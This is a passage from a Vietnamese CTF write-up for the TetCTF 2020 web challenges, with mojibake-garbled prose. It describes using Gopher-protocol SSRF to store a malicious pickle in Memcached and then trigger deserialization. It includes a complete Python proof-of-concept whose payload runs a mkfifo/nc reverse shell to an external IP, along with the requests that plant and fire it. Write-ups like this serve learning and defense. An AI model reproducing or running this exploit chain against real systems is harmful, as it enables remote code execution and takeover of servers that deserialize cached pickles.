ƒë∆∞·ª£c payload b·∫±ng c√°ch n√†o? C√πng xem l·∫°i ƒëo·∫°n code sau:\ndef racingboiz101(_key, _value): _speedup101 = pylibmc.Client([\u0026#34;127.0.0.1:11211\u0026#34;], binary=False) if _speedup101.get(_key) == None: _speedup101.set(_key, \u0026#34;Copyright@HelloVietNamv2\u0026#34;, time=60) _speedup101.set(_value, _value, time=60) return _speedup101.get(_key), _speedup101.get(_value) else: _speedup101.set(_value, _value, time=60) return _speedup101.get(_key), _speedup101.get(_value) V·∫≠y ƒë·ªÉ trigger ƒë∆∞·ª£c th√¨ ch√∫ng ta c·∫ßn ph·∫£i get ƒë∆∞·ª£c key m√† ta ƒë√£ set cho Memcached tr∆∞·ªõc ƒë√≥ th√¥ng qua Gopher protocol.\nExploit D√πng Gopher protocol request ƒë·∫øn Memcached ƒë·ªÉ set 1 key v·ªõi t√™n b·∫•t k√¨ (g·ªçi key n√†y t√™n l√† this_is_key) v·ªõi value l√† pickle serialized data (aka payload) c·ªßa ch√∫ng ta. Sau ƒë√≥ g·ªçi ƒë·∫øn route /GIFmaker ƒë·ªÉ trigger c√°i key n√†y.\nMemcached command c·ªßa ch√∫ng ta nh∆∞ sau:\nset this_is_key 1 10 \u0026lt;payload_length\u0026gt; \u0026lt;payload\u0026gt; this_is_key - l√† t√™n key m√† ch√∫ng ta mu·ªën set. 1 - ƒë√¢y l√† tham s·ªë flags, d√πng ƒë·ªÉ cho pylibmc bi·∫øt khi get key n√†y s·∫Ω ph·∫£i deserialize b·∫±ng Pickle. 10 - expired time, t√≠nh b·∫±ng gi√¢y. \u0026lt;payload_length\u0026gt; v√† \u0026lt;payload\u0026gt; th√¨ ch·∫Øc kh√¥ng c·∫ßn ph·∫£i gi·∫£i th√≠ch n·ªØa. Proof-of-concept from time import time from os import system import urllib import pickle import requests import random import sys ALPHA = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; def rand_string(length): return \u0026#39;\u0026#39;.join([random.choice(ALPHA) for _ in range(length)]) class Exploit(object): def __reduce__(self): return system, (\u0026#39;rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2\u0026gt;\u0026amp;1 | nc 3.0.119.151 3000 \u0026gt; /tmp/f\u0026#39;,) title = rand_string(6) payload = pickle.dumps(Exploit()) payload = [ \u0026#39;\u0026#39;, \u0026#39;set %s 1 10 %d\u0026#39; % (title, len(payload)), payload, \u0026#39;\u0026#39; ] print \u0026#39;Start requesting...\u0026#39; try: res = requests.post(\u0026#39;http://hellovietnamv2.0x1337.space:31337/loadexternalvideo\u0026#39;, data={ \u0026#39;inputTitle\u0026#39;: rand_string(6), \u0026#39;inputDescription\u0026#39;: \u0026#39;description\u0026#39;, \u0026#39;video_url\u0026#39;: \u0026#39;gopher://127.0.0.1:11211/_\u0026#39; + urllib.quote(\u0026#39;\\r\\n\u0026#39;.join(payload)), \u0026#39;timestamp\u0026#39;: int(time()) - 2 }, cookies={ \u0026#39;session\u0026#39;: \u0026#39;redacted\u0026#39; }, timeout=3) print res.content except: pass print \u0026#39;Done!\u0026#39; print \u0026#39;Start triggering payload...\u0026#39; try: res = requests.post(\u0026#39;http://hellovietnamv2.0x1337.space:31337/GIFmaker\u0026#39;, data={ \u0026#39;inputTitle\u0026#39;: title, \u0026#39;inputDescription\u0026#39;: \u0026#39;description\u0026#39;, \u0026#39;filePath\u0026#39;: \u0026#39;static/Uploads/aa587ed19a228d98431f142900b60633.mp4\u0026#39;, \u0026#39;timestamp\u0026#39;: int(time()) - 2 }, cookies={ \u0026#39;session\u0026#39;: \u0026#39;redacted\u0026#39; }, timeout=3) print res.content except: pass print \u0026#39;Done, exit program!\u0026#39; Last words C·∫£m ∆°n 2 anh @ducnt v√† @tsug0d ƒë√£ t·∫°o ra nh·ªØng ƒë·ªÅ Web hay ho cho d·ªãp ƒë·∫ßu nƒÉm 2020, support nhi·ªát t√¨nh cho em ƒë·ªÉ c√≥ th·ªÉ gi·∫£i ƒë∆∞·ª£c h·∫øt t·∫•t c·∫£ c√°c Web challenge c≈©ng nh∆∞ nh·∫±m √¥n l·∫°i nh·ªØng ki·∫øn th·ª©c ƒë√£ ƒë∆∞·ª£c h·ªçc trong nƒÉm 2019 ƒë√£ qua.\nCh√∫c m·ª´ng nƒÉm m·ªõi 2Ô∏è‚É£0Ô∏è‚É£2Ô∏è‚É£0Ô∏è‚É£ everyone!\n","permalink":"https://blog.undo.pw/posts/tetctf-2020-web-writeup/","summary":"Writeup for all the Web challenges in TetCTF 2020","title":"TetCTF 2020 Web writeup"}]